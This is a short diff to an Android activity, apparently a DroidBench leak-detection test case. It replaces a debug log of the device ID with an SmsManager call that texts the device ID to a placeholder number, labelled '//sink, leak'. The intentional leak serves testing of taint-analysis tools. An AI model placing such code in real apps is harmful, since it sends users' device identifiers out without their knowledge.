@@ -6,8 +6,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 import android.view.Menu;
 
 /**
@@ -53,7 +53,8 @@ public class MainActivity extends Activity {
 
 		@Override
 		public void onReceive(Context context, Intent intent) {
-			Log.d("DroidBench", deviceId);
+			SmsManager sms = SmsManager.getDefault();
+			sms.sendTextMessage("+49 1234", null, deviceId, null, null); //sink, leak
 		}
 		
 	}
